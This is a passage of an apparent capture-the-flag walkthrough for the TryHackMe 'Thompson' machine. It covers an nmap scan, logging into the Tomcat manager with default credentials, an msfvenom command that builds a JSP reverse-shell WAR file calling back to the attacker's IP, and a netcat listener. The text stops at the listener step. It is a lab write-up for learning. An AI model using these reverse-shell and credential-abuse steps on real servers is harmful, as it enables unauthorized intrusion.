<tittle>Thompson on TryHackMe - Walkthrough </tittle>

Thompson is simple boot2root machine writen by Guatemala. 
First we must deploy our machine to receive our target IP.

Let's see what we are dealing with!  Firtly I run nmap scan:

<code>nmap -A -T5 -p- <<target IP>></code>

<img width="737" alt="2024-04-26 09_52_13-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/61aa3f00-44fd-43a7-84e7-3ca623a38b9c">

<code>-A flag Enables OS detection, version detection, script scanning, and traceroute,
-T5 for insane speed scan (we dont have to be worry about to be undetected, it just a CTF)
-p- for scan all ports</code>

<img width="541" alt="2024-04-26 09_57_01-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/247e4e18-78e8-43a1-9f35-55a2f1516eb2">
<br>According to our scan We have three ports open. SSH on 22, Apache 8009, and <b>Apache Tomcat</b>b on port 8080. SSH is usually not the first thing we reach for, but port 8080 seems promising... In that case let check in our browser whats on:

<img width="878" alt="2024-04-26 10_02_41-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/6eaf8f3d-aa5a-43d7-ae12-04d0199c40e2">
Everytime when I have some webpage I always check page source for hidden secrects and credential. CTF creator often give us something, but unfortunately not in this case. So lets click Manager App and try login with some default credentials: admin admin. Didn't work. But when we click <code>Cancel</code> were redirect to:

<img width="907" alt="2024-04-26 10_07_03-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/09f464e3-e779-4bdd-8394-715c94318059">
Yay! Weve got credentials!
<code>username:tomcat</code>
<code>password:s3cret</code>code>

It works, Were in!!! So far so good...
After a quick glance at the page we see that we can potentially upload WAR file to the server... but what is that? Uncle Google says:<code>"In software engineering, a WAR file (Web Application Resource or Web application ARchive) is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages (HTML and related files) and other resources that together constitute a web ..."</code> Ok, so We need java reverse shell.

The simpliest way is using Msfvenom for creating our malicious war file:

<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<<our IP>> LPORT=4444 -f war -o shell.war</code>

After generating a payload, firts we start Netcat listener on port 4444:
<code>nc -nlvp 4444</code>
